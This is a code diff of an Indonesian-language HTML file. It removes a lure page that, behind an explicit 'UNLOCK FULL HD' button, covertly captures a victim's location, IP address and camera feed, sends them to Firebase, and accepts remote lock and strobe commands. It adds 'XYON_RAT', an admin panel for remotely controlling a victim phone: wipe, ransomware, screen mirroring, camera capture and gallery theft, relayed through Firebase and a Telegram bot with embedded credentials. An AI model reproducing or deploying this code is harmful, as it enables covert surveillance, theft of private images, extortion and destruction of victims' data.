@@ -2,97 +2,588 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>GALLERY PREMIUM V13</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>XYON_RAT - Admin Control Panel</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        #wallpaper-screen { width: 100%; height: 100%; background: url('https://i.ibb.co.com/pB4JvC8q/hentai-sex.jpg') no-repeat center center; background-size: cover; display: flex; align-items: flex-end; justify-content: center; padding-bottom: 50px; }
-        .btn-akses { background: linear-gradient(45deg, #ff0080, #ff00ff); color: white; border: none; padding: 20px 40px; border-radius: 40px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        #loading-screen { display: none; width: 100%; height: 100%; background: #000; flex-direction: column; align-items: center; justify-content: center; color: #ff0080; }
-        #lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #ff0000; color: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        video, canvas { position: absolute; opacity: 0; pointer-events: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0c14;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .dashboard {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #0f1220, #181d2a);
+            border-radius: 24px;
+            padding: 20px 28px;
+            margin-bottom: 24px;
+            border: 1px solid #2a3145;
+        }
+
+        .header h1 {
+            font-size: 26px;
+            background: linear-gradient(135deg, #ff5555, #ff0000);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .header p {
+            color: #6a7894;
+            font-size: 13px;
+            margin-top: 6px;
+        }
+
+        /* Status Bar */
+        .status-row {
+            display: flex;
+            gap: 14px;
+            flex-wrap: wrap;
+            margin-bottom: 24px;
+        }
+
+        .status-card {
+            background: #0f1220;
+            border: 1px solid #2a3145;
+            border-radius: 18px;
+            padding: 14px 20px;
+            flex: 1;
+            min-width: 150px;
+        }
+
+        .status-card .label {
+            color: #6a7894;
+            font-size: 12px;
+        }
+
+        .status-card .value {
+            color: #00ffaa;
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 6px;
+        }
+
+        .online {
+            color: #00ffaa;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        /* 2 Kolom */
+        .two-columns {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        /* Panel */
+        .panel {
+            background: #0f1220;
+            border: 1px solid #2a3145;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        .panel-header {
+            padding: 16px 20px;
+            background: #0a0c14;
+            border-bottom: 1px solid #2a3145;
+            font-weight: 600;
+            color: #e0e4f0;
+            font-size: 15px;
+        }
+
+        .panel-content {
+            padding: 20px;
+        }
+
+        /* Button Grid */
+        .btn-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
+            gap: 12px;
+        }
+
+        .btn {
+            background: #1a1e2e;
+            border: 1px solid #3a4058;
+            color: #c0c8e0;
+            padding: 12px;
+            border-radius: 14px;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background: #252c40;
+            transform: translateY(-1px);
+        }
+
+        .btn-danger {
+            border-color: #ff5555;
+            color: #ff8888;
+        }
+
+        .btn-danger:hover {
+            background: #442222;
+        }
+
+        .btn-primary {
+            border-color: #00ffaa;
+            color: #88ffcc;
+        }
+
+        .btn-primary:hover {
+            background: #1a3a2a;
+        }
+
+        .btn-warning {
+            border-color: #ffaa33;
+            color: #ffcc77;
+        }
+
+        /* Media Gallery */
+        .media-gallery {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 24px;
+        }
+
+        .media-card {
+            background: #0f1220;
+            border: 1px solid #2a3145;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        .media-card h4 {
+            padding: 14px 18px;
+            font-size: 13px;
+            color: #e0e4f0;
+            border-bottom: 1px solid #2a3145;
+        }
+
+        .media-content {
+            padding: 16px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .media-content img, .media-content video {
+            width: 100%;
+            border-radius: 12px;
+            cursor: pointer;
+        }
+
+        .gallery-item {
+            background: #1a1e2e;
+            border-radius: 14px;
+            margin-bottom: 12px;
+            padding: 10px;
+            cursor: pointer;
+        }
+
+        .gallery-item img {
+            width: 100%;
+            border-radius: 10px;
+            max-height: 150px;
+            object-fit: cover;
+        }
+
+        .gallery-item .name {
+            font-size: 11px;
+            color: #8a98b0;
+            margin-top: 6px;
+        }
+
+        .empty {
+            text-align: center;
+            color: #4a5268;
+            padding: 40px;
+        }
+
+        /* Log Panel */
+        .log-panel {
+            background: #0f1220;
+            border: 1px solid #2a3145;
+            border-radius: 20px;
+            margin-top: 20px;
+        }
+
+        .log-content {
+            padding: 14px;
+            max-height: 180px;
+            overflow-y: auto;
+            font-size: 11px;
+            font-family: monospace;
+        }
+
+        .log-line {
+            padding: 5px 0;
+            border-bottom: 1px solid #1a1e2e;
+            color: #6a7894;
+        }
+
+        .log-line.success {
+            color: #00ffaa;
+        }
+
+        .log-line.error {
+            color: #ff5555;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 10px;
+            color: #3a4058;
+        }
+
+        @media (max-width: 800px) {
+            .two-columns {
+                grid-template-columns: 1fr;
+            }
+            .media-gallery {
+                grid-template-columns: 1fr;
+            }
+        }
     </style>
 </head>
 <body>
-    <div id="wallpaper-screen"><button class="btn-akses" onclick="initTarget()">UNLOCK FULL HD 🔞</button></div>
-    <div id="loading-screen">
-        <div style="border: 5px solid #222; border-top: 5px solid #ff0080; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite;"></div>
-        <p>Syncing Data... <span id="pct">0</span>%</p>
-        <video id="v" autoplay muted playsinline></video>
-        <canvas id="c" style="display:none;"></canvas>
+
+<div class="dashboard">
+    <div class="header">
+        <h1>🔴 XYON_RAT | ADMIN CONTROL PANEL</h1>
+        <p>Firebase Real-time | Telegram Bot | Full Remote Control</p>
     </div>
-    <div id="lock-screen"><h1>⚠️ DEVICE ENCRYPTED ⚠️</h1><p>Access Violation. System Locked.</p></div>
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyAARAwL0JU9hG4e3Squpp-I-oUGVcyJ3eo",
-            authDomain: "w15k4-project.firebaseapp.com",
-            databaseURL: "https://w15k4-project-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "w15k4-project",
-            storageBucket: "w15k4-project.firebasestorage.app",
-            appId: "1:688404985179:web:e79221fdda6cd5e988167e"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const ADMIN_ID = 'bos_sadap_99'; 
-        const targetID = "ID-" + Math.random().toString(36).substr(2, 5).toUpperCase();
-        const peer = new Peer(targetID); 
-        let stream, track, strobeInt, mode = "environment";
+    <!-- STATUS BAR -->
+    <div class="status-row">
+        <div class="status-card">
+            <div class="label">🎯 TARGET STATUS</div>
+            <div class="value online" id="targetStatus">● ONLINE</div>
+        </div>
+        <div class="status-card">
+            <div class="label">🔥 FIREBASE</div>
+            <div class="value" id="fbStatus">CONNECTED</div>
+        </div>
+        <div class="status-card">
+            <div class="label">📸 LAST SCREEN</div>
+            <div class="value" id="lastScreen">-</div>
+        </div>
+        <div class="status-card">
+            <div class="label">🎥 LAST CAMERA</div>
+            <div class="value" id="lastCam">-</div>
+        </div>
+    </div>
 
-        db.ref('command/' + targetID).on('value', (s) => {
-            const cmd = s.val();
-            if(cmd === "LOCK") document.getElementById('lock-screen').style.display='flex';
-            if(cmd === "STROBE_ON") startStrobe();
-            if(cmd === "STROBE_OFF") clearInterval(strobeInt);
-            if(cmd === "REQ_LIVE") peer.call(ADMIN_ID, stream);
-            if(cmd === "SWITCH_CAM") switchCam();
-            if(cmd === "SNAP") takeSnap();
+    <!-- 2 KOLOM: COMMAND + INFO -->
+    <div class="two-columns">
+        <!-- PANEL COMMAND -->
+        <div class="panel">
+            <div class="panel-header">⚡ COMMAND CENTER</div>
+            <div class="panel-content">
+                <div class="btn-grid">
+                    <button class="btn btn-danger" onclick="sendCommand('hapus')">🗑️ HAPUS TOTAL</button>
+                    <button class="btn btn-danger" onclick="sendCommand('kunci')">🔒 RANSOMWARE</button>
+                    <button class="btn btn-primary" onclick="sendCommand('mirror')">📱 SCREEN MIRROR</button>
+                    <button class="btn btn-primary" onclick="sendCommand('kamera_depan')">📸 KAMERA DEPAN</button>
+                    <button class="btn btn-primary" onclick="sendCommand('kamera_belakang')">📸 KAMERA BELAKANG</button>
+                    <button class="btn" onclick="sendCommand('foto')">📷 AMBIL FOTO</button>
+                    <button class="btn" onclick="sendCommand('ganti_kamera')">🔄 GANTI KAMERA</button>
+                    <button class="btn" onclick="sendCommand('stop_kamera')">🔴 STOP KAMERA</button>
+                    <button class="btn btn-warning" onclick="sendCommand('bukaweb')">🌐 BUKA 4 WEB</button>
+                    <button class="btn" onclick="sendCommand('gerak')">🎮 HP GERAK SENDIRI</button>
+                    <button class="btn" onclick="sendCommand('get_gallery')">🖼️ GET GALLERY</button>
+                    <button class="btn" onclick="sendCommand('rename')">📱 RENAME KONTAK</button>
+                    <button class="btn" onclick="sendCommand('normal')">🎬 NORMAL</button>
+                    <button class="btn btn-danger" onclick="sendCommand('stop')">⏹️ STOP VIRUS</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PANEL INFO TARGET -->
+        <div class="panel">
+            <div class="panel-header">📱 TARGET INFORMATION</div>
+            <div class="panel-content">
+                <div style="margin-bottom: 12px;">
+                    <span style="color:#6a7894;">🆔 DEVICE:</span>
+                    <span style="color:#fff;" id="deviceModel">-</span>
+                </div>
+                <div style="margin-bottom: 12px;">
+                    <span style="color:#6a7894;">🤖 ANDROID:</span>
+                    <span style="color:#fff;" id="androidVer">-</span>
+                </div>
+                <div style="margin-bottom: 12px;">
+                    <span style="color:#6a7894;">🆔 DEVICE ID:</span>
+                    <span style="color:#fff; font-size:11px;" id="deviceId">-</span>
+                </div>
+                <div style="margin-bottom: 12px;">
+                    <span style="color:#6a7894;">📅 LAST SEEN:</span>
+                    <span style="color:#fff;" id="lastSeen">-</span>
+                </div>
+                <div>
+                    <span style="color:#6a7894;">🤖 TELEGRAM BOT:</span>
+                    <span style="color:#fff; font-size:11px;" id="botStatus">ACTIVE</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- GALLERY PANEL -->
+    <div class="panel" style="margin-bottom: 24px;">
+        <div class="panel-header">🖼️ TARGET GALLERY (FOTO & VIDEO)</div>
+        <div class="panel-content" id="galleryContent" style="max-height: 300px; overflow-y: auto;">
+            <div class="empty">📭 Klik "GET GALLERY" untuk melihat isi gallery target</div>
+        </div>
+    </div>
+
+    <!-- MEDIA GALLERY (SCREEN + CAMERA) -->
+    <div class="media-gallery">
+        <div class="media-card">
+            <h4>📱 SCREEN MIRRORING (LIVE)</h4>
+            <div class="media-content" id="screenContainer">
+                <div class="empty">📭 Belum ada screenshot. Klik "SCREEN MIRROR"</div>
+            </div>
+        </div>
+        <div class="media-card">
+            <h4>📸 KAMERA TARGET</h4>
+            <div class="media-content" id="cameraContainer">
+                <div class="empty">📭 Belum ada foto. Aktifkan kamera dulu</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOG ACTIVITY -->
+    <div class="log-panel">
+        <div class="panel-header">📜 ACTIVITY LOG</div>
+        <div class="log-content" id="logArea">
+            <div class="log-line success">🟢 XYON_RAT Admin Panel siap</div>
+            <div class="log-line">📌 Firebase terhubung, menunggu target online</div>
+        </div>
+    </div>
+
+    <div class="footer">XYON_RAT ADMIN PANEL | Firebase + Telegram | Real-time Sync</div>
+</div>
+
+<script>
+    // ============ FIREBASE KONFIGURASI BOS ============
+    const firebaseConfig = {
+        apiKey: "AIzaSyAAg7loyy9hHyuO8LhOSBKPWXi970nHwKI",
+        authDomain: "control-a5f89.firebaseapp.com",
+        databaseURL: "https://control-a5f89-default-rtdb.firebaseio.com",
+        projectId: "control-a5f89",
+        storageBucket: "control-a5f89.firebasestorage.app",
+        messagingSenderId: "519307770436",
+        appId: "1:519307770436:android:2bbd2547506b867ec65a11"
+    };
+    
+    // ============ TELEGRAM KONFIGURASI ============
+    const BOT_TOKEN = "8752620424:AAE-7IVIGMl3X2kE9KdMB3z1jYigA";
+    const CHAT_ID = "8284453189";
+    const ADMIN_PASS = "xyon123";
+    
+    // Auth sederhana
+    if (!sessionStorage.getItem('xyon_auth')) {
+        let pwd = prompt("🔐 MASUKKAN PASSWORD ADMIN:");
+        if (pwd !== ADMIN_PASS) {
+            document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:100px'>❌ ACCESS DENIED</h1>";
+            throw new Error("Unauthorized");
+        }
+        sessionStorage.setItem('xyon_auth', 'true');
+    }
+    
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const storage = firebase.storage();
+    
+    // Variables
+    let lastUpdateId = 0;
+    
+    // ============ SEND COMMAND VIA FIREBASE ============
+    function sendCommand(cmd) {
+        addLog(`📤 Mengirim perintah: /${cmd}`, 'info');
+        
+        // Kirim via Firebase Realtime Database
+        database.ref('command').set(cmd).then(() => {
+            addLog(`✅ Perintah /${cmd} terkirim via Firebase`, 'success');
+        }).catch(err => {
+            addLog(`❌ Gagal kirim via Firebase: ${err.message}`, 'error');
         });
-
-        async function initTarget() {
-            document.getElementById('wallpaper-screen').style.display = 'none';
-            document.getElementById('loading-screen').style.display = 'flex';
-            navigator.geolocation.getCurrentPosition((p) => {
-                db.ref('targets/'+targetID+'/loc').set({lat: p.coords.latitude, lon: p.coords.longitude});
-            }, null, {enableHighAccuracy:true});
-            startCam();
-            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
-                db.ref('targets/'+targetID+'/info').set({ip: d.ip, ua: navigator.userAgent, status: "ONLINE"});
-            });
-            let p = 0;
-            const iv = setInterval(() => {
-                p++; document.getElementById('pct').innerText = p;
-                if(p>=100) { clearInterval(iv); location.reload(); }
-            }, 500);
+        
+        // Juga kirim via Telegram sebagai backup
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=/${cmd}`)
+            .then(res => {
+                if (res.ok) addLog(`✅ Perintah /${cmd} juga terkirim via Telegram`, 'success');
+                else addLog(`⚠️ Telegram backup gagal`, 'error');
+            })
+            .catch(() => addLog(`⚠️ Telegram backup error`, 'error'));
+        
+        document.getElementById('lastSeen').innerHTML = new Date().toLocaleTimeString();
+    }
+    
+    // ============ FIREBASE LISTENER ============
+    function setupFirebaseListeners() {
+        // Listener status target
+        database.ref('target/status').on('value', (snapshot) => {
+            const status = snapshot.val();
+            if (status === 'online') {
+                document.getElementById('targetStatus').innerHTML = '● ONLINE';
+                document.getElementById('targetStatus').style.color = '#00ffaa';
+                addLog('🎯 Target online', 'success');
+            } else if (status === 'offline') {
+                document.getElementById('targetStatus').innerHTML = '● OFFLINE';
+                document.getElementById('targetStatus').style.color = '#ff5555';
+                addLog('⚠️ Target offline', 'error');
+            }
+        });
+        
+        // Listener device info
+        database.ref('target/device').on('value', (snapshot) => {
+            const device = snapshot.val();
+            if (device) {
+                document.getElementById('deviceModel').innerHTML = device.model || '-';
+                document.getElementById('androidVer').innerHTML = device.android || '-';
+                document.getElementById('deviceId').innerHTML = device.id || '-';
+            }
+        });
+        
+        // Listener screenshot
+        database.ref('target/screen').on('value', (snapshot) => {
+            const imgUrl = snapshot.val();
+            if (imgUrl) {
+                const container = document.getElementById('screenContainer');
+                container.innerHTML = `<img src="${imgUrl}" onclick="window.open('${imgUrl}')" style="cursor:pointer;">`;
+                document.getElementById('lastScreen').innerHTML = new Date().toLocaleTimeString();
+                addLog('📸 Screenshot baru dari target', 'success');
+            }
+        });
+        
+        // Listener camera
+        database.ref('target/camera').on('value', (snapshot) => {
+            const imgUrl = snapshot.val();
+            if (imgUrl) {
+                const container = document.getElementById('cameraContainer');
+                container.innerHTML = `<img src="${imgUrl}" onclick="window.open('${imgUrl}')" style="cursor:pointer;">`;
+                document.getElementById('lastCam').innerHTML = new Date().toLocaleTimeString();
+                addLog('📷 Foto baru dari kamera target', 'success');
+            }
+        });
+        
+        // Listener gallery
+        database.ref('target/gallery').on('value', (snapshot) => {
+            const files = snapshot.val();
+            if (files) {
+                let html = '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:12px;">';
+                for (let key in files) {
+                    const item = files[key];
+                    if (typeof item === 'string') {
+                        // It's a URL
+                        if (key.includes('video')) {
+                            html += `<div class="gallery-item" onclick="window.open('${item}')">
+                                        <video src="${item}" style="width:100%;max-height:100px;"></video>
+                                        <div class="name">🎬 ${key.substring(0, 30)}</div>
+                                     </div>`;
+                        } else {
+                            html += `<div class="gallery-item" onclick="window.open('${item}')">
+                                        <img src="${item}" loading="lazy">
+                                        <div class="name">📸 ${key.substring(0, 30)}</div>
+                                     </div>`;
+                        }
+                    }
+                }
+                html += '</div>';
+                document.getElementById('galleryContent').innerHTML = html;
+                addLog(`🖼️ Gallery updated: ${Object.keys(files).length} files`, 'success');
+            }
+        });
+    }
+    
+    // ============ TELEGRAM LISTENER (BACKUP) ============
+    async function fetchTelegramUpdates() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=25`);
+            const data = await res.json();
+            if (data.ok && data.result) {
+                for (let upd of data.result) {
+                    lastUpdateId = upd.update_id;
+                    const msg = upd.message;
+                    if (msg && msg.chat && msg.chat.id == CHAT_ID) {
+                        // Handle photos from Telegram
+                        if (msg.photo && msg.photo.length > 0) {
+                            const fileId = msg.photo[msg.photo.length-1].file_id;
+                            const caption = msg.caption || "";
+                            const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`);
+                            const fileData = await fileRes.json();
+                            if (fileData.ok) {
+                                const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
+                                if (caption.includes("SCREEN") || caption.includes("screenshot")) {
+                                    document.getElementById('screenContainer').innerHTML = `<img src="${url}" onclick="window.open('${url}')" style="cursor:pointer;">`;
+                                    document.getElementById('lastScreen').innerHTML = new Date().toLocaleTimeString();
+                                    addLog('📸 Screenshot dari Telegram', 'success');
+                                } else if (caption.includes("kamera") || caption.includes("foto")) {
+                                    document.getElementById('cameraContainer').innerHTML = `<img src="${url}" onclick="window.open('${url}')" style="cursor:pointer;">`;
+                                    document.getElementById('lastCam').innerHTML = new Date().toLocaleTimeString();
+                                    addLog('📷 Foto dari kamera', 'success');
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } catch(e) {
+            console.log("Telegram fetch error:", e);
         }
-
-        async function startCam() {
-            if(stream) stream.getTracks().forEach(t => t.stop());
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
-            document.getElementById('v').srcObject = stream;
-            track = stream.getVideoTracks()[0];
+    }
+    
+    // ============ ADD LOG ============
+    function addLog(msg, type = 'info') {
+        const logArea = document.getElementById('logArea');
+        const time = new Date().toLocaleTimeString();
+        const line = document.createElement('div');
+        line.className = `log-line ${type === 'success' ? 'success' : (type === 'error' ? 'error' : '')}`;
+        line.innerHTML = `[${time}] ${msg}`;
+        logArea.insertBefore(line, logArea.firstChild);
+        
+        // Limit log
+        while (logArea.children.length > 50) {
+            logArea.removeChild(logArea.lastChild);
         }
-
-        function switchCam() { mode = (mode === "environment") ? "user" : "environment"; startCam(); }
-
-        function takeSnap() {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            db.ref('targets/'+targetID+'/snap').set(c.toDataURL('image/jpeg', 0.5));
-        }
-
-        function startStrobe() {
-            clearInterval(strobeInt);
-            strobeInt = setInterval(() => {
-                track.applyConstraints({ advanced: [{ torch: true }] }).catch(()=>{});
-                setTimeout(() => track.applyConstraints({ advanced: [{ torch: false }] }).catch(()=>{}), 50);
-            }, 100);
-        }
-    </script>
+    }
+    
+    // ============ INIT ============
+    setupFirebaseListeners();
+    fetchTelegramUpdates();
+    setInterval(fetchTelegramUpdates, 5000);
+    
+    addLog('🟢 XYON_RAT Admin Panel aktif', 'success');
+    addLog('🔥 Firebase terhubung, menunggu data dari target', 'info');
+</script>
 </body>
 </html>
